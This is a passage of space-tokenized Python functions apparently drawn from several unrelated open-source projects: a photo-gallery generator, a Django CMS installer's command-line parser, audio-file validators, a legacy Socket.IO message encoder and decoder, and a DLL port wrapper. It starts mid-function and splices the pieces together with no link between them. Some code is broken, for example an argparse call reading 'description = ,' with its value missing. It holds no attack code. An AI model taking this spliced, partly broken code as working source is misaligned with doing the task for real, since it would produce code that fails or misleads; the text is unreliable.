for %r : %s" , self , self . _thumbnail ) return self . _thumbnail self . logger . error ( 'Thumbnail not found for %r' , self ) return None
def get_albums ( self , path ) : for name in self . albums [ path ] . subdirs : subdir = os . path . normpath ( join ( path , name ) ) yield subdir , self . albums [ subdir ] for subname , album in self . get_albums ( subdir ) : yield subname , self . albums [ subdir ]
def build ( self , force = False ) : if not self . albums : self . logger . warning ( "No albums found." ) return def log_func ( x ) : # 63 is the total length of progressbar, label, percentage, etc available_length = get_terminal_size ( ) [ 0 ] - 64 if x and available_length > 10 : return x . name [ : available_length ] else : return "" try : with progressbar ( self . albums . values ( ) , label = "Collecting files" , item_show_func = log_func , show_eta = False , file = self . progressbar_target ) as albums : media_list = [ f for album in albums for f in self . process_dir ( album , force = force ) ] except KeyboardInterrupt : sys . exit ( 'Interrupted' ) bar_opt = { 'label' : "Processing files" , 'show_pos' : True , 'file' : self . progressbar_target } failed_files = [ ] if self . pool : try : with progressbar ( length = len ( media_list ) , * * bar_opt ) as bar : for res in self . pool . imap_unordered ( worker , media_list ) : if res : failed_files . append ( res ) bar . update ( 1 ) self . pool . close ( ) self . pool . join ( ) except KeyboardInterrupt : self . pool . terminate ( ) sys . exit ( 'Interrupted' ) except pickle . PicklingError : self . logger . critical ( "Failed to process files with the multiprocessing feature." " This can be caused by some module import or object " "defined in the settings file, which can't be serialized." , exc_info = True ) sys . exit ( 'Abort' ) else : with progressbar ( media_list , * * bar_opt ) as medias : for media_item in medias : res = process_file ( media_item ) if res : failed_files . append ( res ) if failed_files : self . remove_files ( failed_files ) if self . settings [ 'write_html' ] : album_writer = AlbumPageWriter ( self . settings , index_title = self . title ) album_list_writer = AlbumListPageWriter ( self . settings , index_title = self . title ) with progressbar ( self . albums . values ( ) , label = "%16s" % "Writing files" , item_show_func = log_func , show_eta = False , file = self . progressbar_target ) as albums : for album in albums : if album . albums : if album . medias : self . logger . warning ( "Album %s contains sub-albums and images. " "Please move images to their own sub-album. " "Images in album %s will not be visible." , album . title , album . title ) album_list_writer . write ( album ) else : album_writer . write ( album ) print ( '' ) signals . gallery_build . send ( self )
def process_dir ( self , album , force = False ) : for f in album : if isfile ( f . dst_path ) and not force : self . logger . info ( "%s exists - skipping" , f . filename ) self . stats [ f . type + '_skipped' ] += 1 else : self . stats [ f . type ] += 1 yield ( f . type , f . path , f . filename , f . src_path , album . dst_path , self . settings )
def reduce_opacity ( im , opacity ) : assert opacity >= 0 and opacity <= 1 if im . mode != 'RGBA' : im = im . convert ( 'RGBA' ) else : im = im . copy ( ) alpha = im . split ( ) [ 3 ] alpha = ImageEnhance . Brightness ( alpha ) . enhance ( opacity ) im . putalpha ( alpha ) return im
def watermark ( im , mark , position , opacity = 1 ) : if opacity < 1 : mark = reduce_opacity ( mark , opacity ) if im . mode != 'RGBA' : im = im . convert ( 'RGBA' ) # create a transparent layer the size of the image and draw the # watermark in that layer. layer = Image . new ( 'RGBA' , im . size , ( 0 , 0 , 0 , 0 ) ) if position == 'tile' : for y in range ( 0 , im . size [ 1 ] , mark . size [ 1 ] ) : for x in range ( 0 , im . size [ 0 ] , mark . size [ 0 ] ) : layer . paste ( mark , ( x , y ) ) elif position == 'scale' : # scale, but preserve the aspect ratio ratio = min ( float ( im . size [ 0 ] ) / mark . size [ 0 ] , float ( im . size [ 1 ] ) / mark . size [ 1 ] ) w = int ( mark . size [ 0 ] * ratio ) h = int ( mark . size [ 1 ] * ratio ) mark = mark . resize ( ( w , h ) ) layer . paste ( mark , ( int ( ( im . size [ 0 ] - w ) / 2 ) , int ( ( im . size [ 1 ] - h ) / 2 ) ) ) else : layer . paste ( mark , position ) # composite the watermark with the layer return Image . composite ( layer , im , layer )
def video_size ( source , converter = 'ffmpeg' ) : res = subprocess . run ( [ converter , '-i' , source ] , stderr = subprocess . PIPE ) stderr = res . stderr . decode ( 'utf8' ) pattern = re . compile ( r'Stream.*Video.* ([0-9]+)x([0-9]+)' ) match = pattern . search ( stderr ) rot_pattern = re . compile ( r'rotate\s*:\s*-?(90|270)' ) rot_match = rot_pattern . search ( stderr ) if match : x , y = int ( match . groups ( ) [ 0 ] ) , int ( match . groups ( ) [ 1 ] ) else : x = y = 0 if rot_match : x , y = y , x return x , y
def generate_thumbnail ( source , outname , box , delay , fit = True , options = None , converter = 'ffmpeg' ) : logger = logging . getLogger ( __name__ ) tmpfile = outname + ".tmp.jpg" # dump an image of the video cmd = [ converter , '-i' , source , '-an' , '-r' , '1' , '-ss' , delay , '-vframes' , '1' , '-y' , tmpfile ] logger . debug ( 'Create thumbnail for video: %s' , ' ' . join ( cmd ) ) check_subprocess ( cmd , source , outname ) # use the generate_thumbnail function from sigal.image image . generate_thumbnail ( tmpfile , outname , box , fit = fit , options = options ) # remove the image os . unlink ( tmpfile )
def generate_context ( self , album ) : from . import __url__ as sigal_link self . logger . info ( "Output album : %r" , album ) return { 'album' : album , 'index_title' : self . index_title , 'settings' : self . settings , 'sigal_link' : sigal_link , 'theme' : { 'name' : os . path . basename ( self . theme ) , 'url' : url_from_path ( os . path . relpath ( self . theme_path , album . dst_path ) ) } , }
def write ( self , album ) : page = self . template . render ( * * self . generate_context ( album ) ) output_file = os . path . join ( album . dst_path , album . output_file ) with open ( output_file , 'w' , encoding = 'utf-8' ) as f : f . write ( page )
def read_settings ( filename = None ) : logger = logging . getLogger ( __name__ ) logger . info ( "Reading settings ..." ) settings = _DEFAULT_CONFIG . copy ( ) if filename : logger . debug ( "Settings file: %s" , filename ) settings_path = os . path . dirname ( filename ) tempdict = { } with open ( filename ) as f : code = compile ( f . read ( ) , filename , 'exec' ) exec ( code , tempdict ) settings . update ( ( k , v ) for k , v in tempdict . items ( ) if k not in [ '__builtins__' ] ) # Make the paths relative to the settings file paths = [ 'source' , 'destination' , 'watermark' ] if os . path . isdir ( join ( settings_path , settings [ 'theme' ] ) ) and os . path . isdir ( join ( settings_path , settings [ 'theme' ] , 'templates' ) ) : paths . append ( 'theme' ) for p in paths : path = settings [ p ] if path and not isabs ( path ) : settings [ p ] = abspath ( normpath ( join ( settings_path , path ) ) ) logger . debug ( "Rewrite %s : %s -> %s" , p , path , settings [ p ] ) for key in ( 'img_size' , 'thumb_size' , 'video_size' ) : w , h = settings [ key ] if h > w : settings [ key ] = ( h , w ) logger . warning ( "The %s setting should be specified with the " "largest value first." , key ) if not settings [ 'img_processor' ] : logger . info ( 'No Processor, images will not be resized' ) logger . debug ( 'Settings:\n%s' , pformat ( settings , width = 120 ) ) return settings
def generate_media_pages ( gallery ) : writer = PageWriter ( gallery . settings , index_title = gallery . title ) for album in gallery . albums . values ( ) : medias = album . medias next_medias = medias [ 1 : ] + [ None ] previous_medias = [ None ] + medias [ : - 1 ] # The media group allows us to easily get next and previous links media_groups = zip ( medias , next_medias , previous_medias ) for media_group in media_groups : writer . write ( album , media_group )
def write ( self , album , media_group ) : from sigal import __url__ as sigal_link file_path = os . path . join ( album . dst_path , media_group [ 0 ] . filename ) page = self . template . render ( { 'album' : album , 'media' : media_group [ 0 ] , 'previous_media' : media_group [ - 1 ] , 'next_media' : media_group [ 1 ] , 'index_title' : self . index_title , 'settings' : self . settings , 'sigal_link' : sigal_link , 'theme' : { 'name' : os . path . basename ( self . theme ) , 'url' : url_from_path ( os . path . relpath ( self . theme_path , album . dst_path ) ) } , } ) output_file = "%s.html" % file_path with open ( output_file , 'w' , encoding = 'utf-8' ) as f : f . write ( page )
def cleanup_directory ( config_data ) : if os . path . exists ( config_data . project_directory ) : choice = False if config_data . noinput is False and not config_data . verbose : choice = query_yes_no ( 'The installation failed.\n' 'Do you want to clean up by removing {0}?\n' '\tWarning: this will delete all files in:\n' '\t\t{0}\n' 'Do you want to cleanup?' . format ( os . path . abspath ( config_data . project_directory ) ) , 'no' ) else : sys . stdout . write ( 'The installation has failed.\n' ) if config_data . skip_project_dir_check is False and ( choice or ( config_data . noinput and config_data . delete_project_dir ) ) : sys . stdout . write ( 'Removing everything under {0}\n' . format ( os . path . abspath ( config_data . project_directory ) ) ) shutil . rmtree ( config_data . project_directory , True )
def parse ( args ) : from tzlocal import get_localzone try : timezone = get_localzone ( ) if isinstance ( timezone , pytz . BaseTzInfo ) : timezone = timezone . zone except Exception : # pragma: no cover timezone = 'UTC' if timezone == 'local' : timezone = 'UTC' parser = argparse . ArgumentParser ( description = , formatter_class = argparse . RawTextHelpFormatter ) parser . add_argument ( '--config-file' , dest = 'config_file' , action = 'store' , default = None , help = 'Configuration file for djangocms_installer' ) parser . add_argument ( '--config-dump' , dest = 'config_dump' , action = 'store' , default = None , help = 'Dump configuration file with current args' ) parser . add_argument ( '--db' , '-d' , dest = 'db' , action = DbAction , default = 'sqlite://localhost/project.db' , help = 'Database configuration (in URL format). ' 'Example: sqlite://localhost/project.db' ) parser . add_argument ( '--i18n' , '-i' , dest = 'i18n' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'yes' , help = 'Activate Django I18N / L10N setting; this is ' 'automatically activated if more than ' 'language is provided' ) parser . add_argument ( '--use-tz' , '-z' , dest = 'use_timezone' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'yes' , help = 'Activate Django timezone support' ) parser . add_argument ( '--timezone' , '-t' , dest = 'timezone' , required = False , default = timezone , action = 'store' , help = 'Optional default time zone. Example: Europe/Rome' ) parser . add_argument ( '--reversion' , '-e' , dest = 'reversion' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'yes' , help = 'Install and configure reversion support ' '(only for django CMS 3.2 and 3.3)' ) parser . add_argument ( '--permissions' , dest = 'permissions' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'no' , help = 'Activate CMS permission management' ) parser . add_argument ( '--pip-options' , help = 'pass custom pip options' , default = '' ) parser . add_argument ( '--languages' , '-l' , dest = 'languages' , action = 'append' , help = 'Languages to enable. Option can be provided multiple times, or as a ' 'comma separated list. Only language codes supported by Django can ' 'be used here. Example: en, fr-FR, it-IT' ) parser . add_argument ( '--django-version' , dest = 'django_version' , action = 'store' , choices = data . DJANGO_SUPPORTED , default = data . DJANGO_DEFAULT , help = 'Django version' ) parser . add_argument ( '--cms-version' , '-v' , dest = 'cms_version' , action = 'store' , choices = data . DJANGOCMS_SUPPORTED , default = data . DJANGOCMS_DEFAULT , help = 'django CMS version' ) parser . add_argument ( '--parent-dir' , '-p' , dest = 'project_directory' , default = '' , action = 'store' , help = 'Optional project parent directory' ) parser . add_argument ( '--bootstrap' , dest = 'bootstrap' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'no' , help = 'Use Twitter Bootstrap Theme' ) parser . add_argument ( '--templates' , dest = 'templates' , action = 'store' , default = 'no' , help = 'Use custom template set' ) parser . add_argument ( '--starting-page' , dest = 'starting_page' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'no' , help = 'Load a starting page with examples after installation ' '(english language only). Choose "no" if you use a ' 'custom template set.' ) parser . add_argument ( dest = 'project_name' , action = 'store' , help = 'Name of the project to be created' ) # Command that lists the supported plugins in verbose description parser . add_argument ( '--list-plugins' , '-P' , dest = 'plugins' , action = 'store_true' , help = 'List plugins that\'s going to be installed and configured' ) # Command that lists the supported plugins in verbose description parser . add_argument ( '--dump-requirements' , '-R' , dest = 'dump_reqs' , action = 'store_true' , help = 'It dumps the requirements that would be installed according to ' 'parameters given. Together with --requirements argument is useful ' 'for customizing the virtualenv' ) # Advanced options. These have a predefined default and are not asked # by config wizard. parser . add_argument ( '--no-input' , '-q' , dest = 'noinput' , action = 'store_true' , default = True , help = 'Don\'t run the configuration wizard, just use the ' 'provided values' ) parser . add_argument ( '--wizard' , '-w' , dest = 'wizard' , action = 'store_true' , default = False , help = 'Run the configuration wizard' ) parser . add_argument ( '--verbose' , dest = 'verbose' , action = 'store_true' , default = False , help = 'Be more verbose and don\'t swallow subcommands output' ) parser . add_argument ( '--filer' , '-f' , dest = 'filer' , action = 'store_true' , default = True , help = 'Install and configure django-filer plugins ' '- Always enabled' ) parser . add_argument ( '--requirements' , '-r' , dest = 'requirements_file' , action = 'store' , default = None , help = 'Externally defined requirements file' ) parser . add_argument ( '--no-deps' , '-n' , dest = 'no_deps' , action = 'store_true' , default = False , help = 'Don\'t install package dependencies' ) parser . add_argument ( '--no-plugins' , dest = 'no_plugins' , action = 'store_true' , default = False , help = 'Don\'t install plugins' ) parser . add_argument ( '--no-db-driver' , dest = 'no_db_driver' , action = 'store_true' , default = False , help = 'Don\'t install database package' ) parser . add_argument ( '--no-sync' , '-m' , dest = 'no_sync' , action = 'store_true' , default = False , help = 'Don\'t run syncdb / migrate after bootstrapping' ) parser . add_argument ( '--no-user' , '-u' , dest = 'no_user' , action = 'store_true' , default = False , help = 'Don\'t create the admin user' ) parser . add_argument ( '--template' , dest = 'template' , action = 'store' , default = None , help = 'The path or URL to load the django project ' 'template from.' ) parser . add_argument ( '--extra-settings' , dest = 'extra_settings' , action = 'store' , default = None , help = 'The path to an file that contains extra settings.' ) parser . add_argument ( '--skip-empty-check' , '-s' , dest = 'skip_project_dir_check' , action = 'store_true' , default = False , help = 'Skip the check if project dir is empty.' ) parser . add_argument ( '--delete-project-dir' , '-c' , dest = 'delete_project_dir' , action = 'store_true' , default = False , help = 'Delete project directory on creation failure.' ) parser . add_argument ( '--utc' , dest = 'utc' , action = 'store_true' , default = False , help = 'Use UTC timezone.' ) if '--utc' in args : for action in parser . _positionals . _actions : if action . dest == 'timezone' : action . default = 'UTC' # If config_args then pretend that config args came from the stdin and run parser again. config_args = ini . parse_config_file ( parser , args ) args = parser . parse_args ( config_args + args ) if not args . wizard : args . noinput = True else : args . noinput = False if not args . project_directory : args . project_directory = args . project_name args . project_directory = os . path . abspath ( args . project_directory ) # First of all, check if the project name is valid if not validate_project ( args . project_name ) : sys . stderr . write ( 'Project name "{0}" is not a valid app name, or it\'s already defined. ' 'Please use only numbers, letters and underscores.\n' . format ( args . project_name ) ) sys . exit ( 3 ) # Checking the given path setattr ( args , 'project_path' , os . path . join ( args . project_directory , args . project_name ) . strip ( ) ) if not args . skip_project_dir_check : if ( os . path . exists ( args . project_directory ) and [ path for path in os . listdir ( args . project_directory ) if not path . startswith ( '.' ) ] ) : sys . stderr . write ( 'Path "{0}" already exists and is not empty, please choose a different one\n' 'If you want to use this path anyway use the -s flag to skip this check.\n' '' . format ( args . project_directory ) ) sys . exit ( 4 ) if os . path . exists ( args . project_path ) : sys . stderr . write ( 'Path "{0}" already exists, please choose a different one\n' . format ( args . project_path ) ) sys . exit ( 4 ) if args . config_dump and os . path . isfile ( args . config_dump ) : sys . stdout . write ( 'Cannot dump because given configuration file "{0}" exists.\n' . format ( args . config_dump ) ) sys . exit ( 8 ) args = _manage_args ( parser , args ) # what do we want here?! # * if languages are given as multiple arguments, let's use it as is # * if no languages are given, use a default and stop handling it further # * if languages are given as a comma-separated list, split it and use the #   resulting list. if not args . languages : try : args . languages = [ locale . getdefaultlocale ( ) [ 0 ] . split ( '_' ) [ 0 ] ] except Exception : # pragma: no cover args . languages = [ 'en' ] elif isinstance ( args . languages , six . string_types ) : args . languages = args . languages . split ( ',' ) elif len ( args . languages ) == 1 and isinstance ( args . languages [ 0 ] , six . string_types ) : args . languages = args . languages [ 0 ] . split ( ',' ) args . languages = [ lang . strip ( ) . lower ( ) for lang in args . languages ] if len ( args . languages ) > 1 : args . i18n = 'yes' args . aldryn = False args . filer = True # Convert version to numeric format for easier checking try : django_version , cms_version = supported_versions ( args . django_version , args . cms_version ) cms_package = data . PACKAGE_MATRIX . get ( cms_version , data . PACKAGE_MATRIX [ data . DJANGOCMS_LTS ] ) except RuntimeError as e : # pragma: no cover sys . stderr . write ( compat . unicode ( e ) ) sys . exit ( 6 ) if django_version is None : # pragma: no cover sys . stderr . write ( 'Please provide a Django supported version: {0}. Only Major.Minor ' 'version selector is accepted\n' . format ( ', ' . join ( data . DJANGO_SUPPORTED ) ) ) sys . exit ( 6 ) if cms_version is None : # pragma: no cover sys . stderr . write ( 'Please provide a django CMS supported version: {0}. Only Major.Minor ' 'version selector is accepted\n' . format ( ', ' . join ( data . DJANGOCMS_SUPPORTED ) ) ) sys . exit ( 6 ) default_settings = '{}.settings' . format ( args . project_name ) env_settings = os . environ . get ( 'DJANGO_SETTINGS_MODULE' , default_settings ) if env_settings != default_settings : sys . stderr . write ( '`DJANGO_SETTINGS_MODULE` is currently set to \'{0}\' which is not compatible with ' 'djangocms installer.\nPlease unset `DJANGO_SETTINGS_MODULE` and re-run the installer ' '\n' . format ( env_settings ) ) sys . exit ( 10 ) if not getattr ( args , 'requirements_file' ) : requirements = [ ] # django CMS version check if args . cms_version == 'develop' : requirements . append ( cms_package ) warnings . warn ( data . VERSION_WARNING . format ( 'develop' , 'django CMS' ) ) elif args . cms_version == 'rc' : # pragma: no cover requirements . append ( cms_package ) elif args . cms_version == 'beta' : # pragma: no cover requirements . append ( cms_package ) warnings . warn ( data . VERSION_WARNING . format ( 'beta' , 'django CMS' ) ) else : requirements . append ( cms_package ) if args . cms_version in ( 'rc' , 'develop' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-master' ] ) elif LooseVersion ( cms_version ) >= LooseVersion ( '3.6' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-3.6' ] ) elif LooseVersion ( cms_version ) >= LooseVersion ( '3.5' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-3.5' ] ) elif LooseVersion ( cms_version ) >= LooseVersion ( '3.4' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-3.4' ] ) if not args . no_db_driver : requirements . append ( args . db_driver ) if not args . no_plugins : if args . cms_version in ( 'rc' , 'develop' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-master' ] ) elif LooseVersion ( cms_version ) >= LooseVersion ( '3.6' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-3.6' ] ) elif LooseVersion ( cms_version ) >= LooseVersion ( '3.5' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-3.5' ] ) elif LooseVersion ( cms_version ) >= LooseVersion ( '3.4' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-3.4' ] ) requirements . extend ( data . REQUIREMENTS [ 'filer' ] ) if args . aldryn : # pragma: no cover requirements . extend ( data . REQUIREMENTS [ 'aldryn' ] ) # Django version check if args . django_version == 'develop' : # pragma: no cover requirements . append ( data . DJANGO_DEVELOP ) warnings . warn ( data . VERSION_WARNING . format ( 'develop' , 'Django' ) ) elif args . django_version == 'beta' : # pragma: no cover requirements . append ( data . DJANGO_BETA ) warnings . warn ( data . VERSION_WARNING . format ( 'beta' , 'Django' ) ) else : requirements . append ( 'Django<{0}' . format ( less_than_version ( django_version ) ) ) if django_version == '1.8' : requirements . extend ( data . REQUIREMENTS [ 'django-1.8' ] ) elif django_version == '1.9' : requirements . extend ( data . REQUIREMENTS [ 'django-1.9' ] ) elif django_version == '1.10' : requirements . extend ( data . REQUIREMENTS [ 'django-1.10' ] ) elif django_version == '1.11' : requirements . extend ( data . REQUIREMENTS [ 'django-1.11' ] ) elif django_version == '2.0' : requirements . extend ( data . REQUIREMENTS [ 'django-2.0' ] ) elif django_version == '2.1' : requirements . extend ( data . REQUIREMENTS [ 'django-2.1' ] ) requirements . extend ( data . REQUIREMENTS [ 'default' ] ) setattr ( args , 'requirements' , '\n' . join ( requirements ) . strip ( ) ) # Convenient shortcuts setattr ( args , 'cms_version' , cms_version ) setattr ( args , 'django_version' , django_version ) setattr ( args , 'settings_path' , os . path . join ( args . project_directory , args . project_name , 'settings.py' ) . strip ( ) ) setattr ( args , 'urlconf_path' , os . path . join ( args . project_directory , args . project_name , 'urls.py' ) . strip ( ) ) if args . config_dump : ini . dump_config_file ( args . config_dump , args , parser ) return args
def _manage_args ( parser , args ) : for item in data . CONFIGURABLE_OPTIONS : action = parser . _option_string_actions [ item ] choices = default = '' input_value = getattr ( args , action . dest ) new_val = None # cannot count this until we find a way to test input if not args . noinput : # pragma: no cover if action . choices : choices = ' (choices: {0})' . format ( ', ' . join ( action . choices ) ) if input_value : if type ( input_value ) == list : default = ' [default {0}]' . format ( ', ' . join ( input_value ) ) else : default = ' [default {0}]' . format ( input_value ) while not new_val : prompt = '{0}{1}{2}: ' . format ( action . help , choices , default ) if action . choices in ( 'yes' , 'no' ) : new_val = utils . query_yes_no ( prompt ) else : new_val = compat . input ( prompt ) new_val = compat . clean ( new_val ) if not new_val and input_value : new_val = input_value if new_val and action . dest == 'templates' : if new_val != 'no' and not os . path . isdir ( new_val ) : sys . stdout . write ( 'Given directory does not exists, retry\n' ) new_val = False if new_val and action . dest == 'db' : action ( parser , args , new_val , action . option_strings ) new_val = getattr ( args , action . dest ) else : if not input_value and action . required : raise ValueError ( 'Option {0} is required when in no-input mode' . format ( action . dest ) ) new_val = input_value if action . dest == 'db' : action ( parser , args , new_val , action . option_strings ) new_val = getattr ( args , action . dest ) if action . dest == 'templates' and ( new_val == 'no' or not os . path . isdir ( new_val ) ) : new_val = False if action . dest in ( 'bootstrap' , 'starting_page' ) : new_val = ( new_val == 'yes' ) setattr ( args , action . dest , new_val ) return args
def supported_versions ( django , cms ) : cms_version = None django_version = None try : cms_version = Decimal ( cms ) except ( ValueError , InvalidOperation ) : try : cms_version = CMS_VERSION_MATRIX [ str ( cms ) ] except KeyError : pass try : django_version = Decimal ( django ) except ( ValueError , InvalidOperation ) : try : django_version = DJANGO_VERSION_MATRIX [ str ( django ) ] except KeyError : # pragma: no cover pass try : if ( cms_version and django_version and not ( LooseVersion ( VERSION_MATRIX [ compat . unicode ( cms_version ) ] [ 0 ] ) <= LooseVersion ( compat . unicode ( django_version ) ) <= LooseVersion ( VERSION_MATRIX [ compat . unicode ( cms_version ) ] [ 1 ] ) ) ) : raise RuntimeError ( 'Django and django CMS versions doesn\'t match: ' 'Django {0} is not supported by django CMS {1}' . format ( django_version , cms_version ) ) except KeyError : raise RuntimeError ( 'Django and django CMS versions doesn\'t match: ' 'Django {0} is not supported by django CMS {1}' . format ( django_version , cms_version ) ) return ( compat . unicode ( django_version ) if django_version else django_version , compat . unicode ( cms_version ) if cms_version else cms_version )
def dump_config_file ( filename , args , parser = None ) : config = ConfigParser ( ) config . add_section ( SECTION ) if parser is None : for attr in args : config . set ( SECTION , attr , args . attr ) else : keys_empty_values_not_pass = ( '--extra-settings' , '--languages' , '--requirements' , '--template' , '--timezone' ) # positionals._option_string_actions for action in parser . _actions : if action . dest in ( 'help' , 'config_file' , 'config_dump' , 'project_name' ) : continue keyp = action . option_strings [ 0 ] option_name = keyp . lstrip ( '-' ) option_value = getattr ( args , action . dest ) if any ( [ i for i in keys_empty_values_not_pass if i in action . option_strings ] ) : if action . dest == 'languages' : if len ( option_value ) == 1 and option_value [ 0 ] == 'en' : config . set ( SECTION , option_name , '' ) else : config . set ( SECTION , option_name , ',' . join ( option_value ) ) else : config . set ( SECTION , option_name , option_value if option_value else '' ) elif action . choices == ( 'yes' , 'no' ) : config . set ( SECTION , option_name , 'yes' if option_value else 'no' ) elif action . dest == 'templates' : config . set ( SECTION , option_name , option_value if option_value else 'no' ) elif action . dest == 'cms_version' : version = ( 'stable' if option_value == CMS_VERSION_MATRIX [ 'stable' ] else option_value ) config . set ( SECTION , option_name , version ) elif action . dest == 'django_version' : version = ( 'stable' if option_value == DJANGO_VERSION_MATRIX [ 'stable' ] else option_value ) config . set ( SECTION , option_name , version ) elif action . const : config . set ( SECTION , option_name , 'true' if option_value else 'false' ) else : config . set ( SECTION , option_name , str ( option_value ) ) with open ( filename , 'w' ) as fp : config . write ( fp )
def _validate_sample_rates ( input_filepath_list , combine_type ) : sample_rates = [ file_info . sample_rate ( f ) for f in input_filepath_list ] if not core . all_equal ( sample_rates ) : raise IOError ( "Input files do not have the same sample rate. The {} combine " "type requires that all files have the same sample rate" . format ( combine_type ) )
def _validate_num_channels ( input_filepath_list , combine_type ) : channels = [ file_info . channels ( f ) for f in input_filepath_list ] if not core . all_equal ( channels ) : raise IOError ( "Input files do not have the same number of channels. The " "{} combine type requires that all files have the same " "number of channels" . format ( combine_type ) )
def reverse ( self ) : effect_args = [ 'reverse' ] self . effects . extend ( effect_args ) self . effects_log . append ( 'reverse' ) return self
def join ( self , room ) : self . socket . rooms . add ( self . _get_room_name ( room ) )
def leave ( self , room ) : self . socket . rooms . remove ( self . _get_room_name ( room ) )
def _save_ack_callback ( self , msgid , callback ) : if msgid in self . ack_callbacks : return False self . ack_callbacks [ msgid ] = callback
def _heartbeat ( self ) : interval = self . config [ 'heartbeat_interval' ] while self . connected : gevent . sleep ( interval ) # TODO: this process could use a timeout object like the disconnect #       timeout thing, and ONLY send packets when none are sent! #       We would do that by calling timeout.set() for a "sending" #       timeout.  If we're sending 100 messages a second, there is #       no need to push some heartbeats in there also. self . put_client_msg ( "2::" )
def _spawn_heartbeat ( self ) : self . spawn ( self . _heartbeat ) self . spawn ( self . _heartbeat_timeout )
def encode ( data , json_dumps = default_json_dumps ) : payload = '' msg = str ( MSG_TYPES [ data [ 'type' ] ] ) if msg in [ '0' , '1' ] : # '1::' [path] [query] msg += '::' + data [ 'endpoint' ] if 'qs' in data and data [ 'qs' ] != '' : msg += ':' + data [ 'qs' ] elif msg == '2' : # heartbeat msg += '::' elif msg in [ '3' , '4' , '5' ] : # '3:' [id ('+')] ':' [endpoint] ':' [data] # '4:' [id ('+')] ':' [endpoint] ':' [json] # '5:' [id ('+')] ':' [endpoint] ':' [json encoded event] # The message id is an incremental integer, required for ACKs. # If the message id is followed by a +, the ACK is not handled by # socket.io, but by the user instead. if msg == '3' : payload = data [ 'data' ] if msg == '4' : payload = json_dumps ( data [ 'data' ] ) if msg == '5' : d = { } d [ 'name' ] = data [ 'name' ] if 'args' in data and data [ 'args' ] != [ ] : d [ 'args' ] = data [ 'args' ] payload = json_dumps ( d ) if 'id' in data : msg += ':' + str ( data [ 'id' ] ) if data [ 'ack' ] == 'data' : msg += '+' msg += ':' else : msg += '::' if 'endpoint' not in data : data [ 'endpoint' ] = '' if payload != '' : msg += data [ 'endpoint' ] + ':' + payload else : msg += data [ 'endpoint' ] elif msg == '6' : # '6:::' [id] '+' [data] msg += '::' + data . get ( 'endpoint' , '' ) + ':' + str ( data [ 'ackId' ] ) if 'args' in data and data [ 'args' ] != [ ] : msg += '+' + json_dumps ( data [ 'args' ] ) elif msg == '7' : # '7::' [endpoint] ':' [reason] '+' [advice] msg += ':::' if 'reason' in data and data [ 'reason' ] != '' : msg += str ( ERROR_REASONS [ data [ 'reason' ] ] ) if 'advice' in data and data [ 'advice' ] != '' : msg += '+' + str ( ERROR_ADVICES [ data [ 'advice' ] ] ) msg += data [ 'endpoint' ] # NoOp, used to close a poll after the polling duration time elif msg == '8' : msg += '::' return msg
def decode ( rawstr , json_loads = default_json_loads ) : decoded_msg = { } try : # Handle decoding in Python<3. rawstr = rawstr . decode ( 'utf-8' ) except AttributeError : pass split_data = rawstr . split ( ":" , 3 ) msg_type = split_data [ 0 ] msg_id = split_data [ 1 ] endpoint = split_data [ 2 ] data = '' if msg_id != '' : if "+" in msg_id : msg_id = msg_id . split ( '+' ) [ 0 ] decoded_msg [ 'id' ] = int ( msg_id ) decoded_msg [ 'ack' ] = 'data' else : decoded_msg [ 'id' ] = int ( msg_id ) decoded_msg [ 'ack' ] = True # common to every message msg_type_id = int ( msg_type ) if msg_type_id in MSG_VALUES : decoded_msg [ 'type' ] = MSG_VALUES [ int ( msg_type ) ] else : raise Exception ( "Unknown message type: %s" % msg_type ) decoded_msg [ 'endpoint' ] = endpoint if len ( split_data ) > 3 : data = split_data [ 3 ] if msg_type == "0" : # disconnect pass elif msg_type == "1" : # connect decoded_msg [ 'qs' ] = data elif msg_type == "2" : # heartbeat pass elif msg_type == "3" : # message decoded_msg [ 'data' ] = data elif msg_type == "4" : # json msg decoded_msg [ 'data' ] = json_loads ( data ) elif msg_type == "5" : # event try : data = json_loads ( data ) except ValueError : print ( "Invalid JSON event message" , data ) decoded_msg [ 'args' ] = [ ] else : decoded_msg [ 'name' ] = data . pop ( 'name' ) if 'args' in data : decoded_msg [ 'args' ] = data [ 'args' ] else : decoded_msg [ 'args' ] = [ ] elif msg_type == "6" : # ack if '+' in data : ackId , data = data . split ( '+' ) decoded_msg [ 'ackId' ] = int ( ackId ) decoded_msg [ 'args' ] = json_loads ( data ) else : decoded_msg [ 'ackId' ] = int ( data ) decoded_msg [ 'args' ] = [ ] elif msg_type == "7" : # error if '+' in data : reason , advice = data . split ( '+' ) decoded_msg [ 'reason' ] = REASONS_VALUES [ int ( reason ) ] decoded_msg [ 'advice' ] = ADVICES_VALUES [ int ( advice ) ] else : decoded_msg [ 'advice' ] = '' if data != '' : decoded_msg [ 'reason' ] = REASONS_VALUES [ int ( data ) ] else : decoded_msg [ 'reason' ] = '' elif msg_type == "8" : # noop pass return decoded_msg
def get_socket ( self , sessid = '' ) : socket = self . sockets . get ( sessid ) if sessid and not socket : return None # you ask for a session that doesn't exist! if socket is None : socket = Socket ( self , self . config ) self . sockets [ socket . sessid ] = socket else : socket . incr_hits ( ) return socket
def write ( self , data ) : args = parse_qs ( self . handler . environ . get ( "QUERY_STRING" ) ) if "i" in args : i = args [ "i" ] else : i = "0" # TODO: don't we need to quote this data in here ? super ( JSONPolling , self ) . write ( "io.j[%s]('%s');" % ( i , data ) )
def remove_binaries ( ) : patterns = ( "adslib/*.a" , "adslib/*.o" , "adslib/obj/*.o" , "adslib/*.bin" , "adslib/*.so" , ) for f in functools . reduce ( operator . iconcat , [ glob . glob ( p ) for p in patterns ] ) : os . remove ( f )
def adsPortCloseEx ( port ) : # type: (int) -> None port_close_ex = _adsDLL . AdsPortCloseEx port_close_ex . restype = ctypes . c_long error_code = port_close_ex ( port ) if error_code : raise ADSError ( error_code )
